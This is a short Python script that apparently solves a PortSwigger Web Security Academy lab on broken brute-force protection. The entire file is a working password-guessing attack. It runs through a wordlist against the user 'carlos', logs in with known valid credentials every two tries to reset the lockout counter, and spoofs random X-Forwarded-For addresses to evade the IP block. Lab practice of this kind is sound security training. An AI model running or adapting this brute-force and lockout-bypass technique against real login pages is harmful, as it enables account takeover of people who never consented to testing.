#Broken Brute-force protection, IP Block
#This is based upon the number of times you are allowed to enter credentials and if wrong after certain block, your IP gets blocked
#SOlution: Bruteforce multiple times with unknown credentials and login with valid credentials to escape from block. Repeat until credentials found

import requests
import random

url = "https://0ada00340470b636c0355b67002d00a0.web-security-academy.net/login"
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
passwords = fd.read()
fd.close()
password_lists = list(passwords.split('\n'))

counter = 0

for i in password_lists:
    if counter == 2:
        #Consider wiener is us, i.e valid credentials so:
        data = {
            "username":"wiener",
            "password":"peter"
        }
        r = requests.post(url,data=data)
        counter = 0
    header = {
        "X-Forwarded-For":"127.{}.{}.{}".format(random.randint(0, 256),random.randint(0, 256),random.randint(0, 256))
    }
    #username=carlos&password=password
    data = {
        "username":"carlos", # username is known
        "password":i
    }
    r = requests.post(url,headers=header,data=data)
    counter += 1
    if "My Account" in r.text:
        print(i)
        break
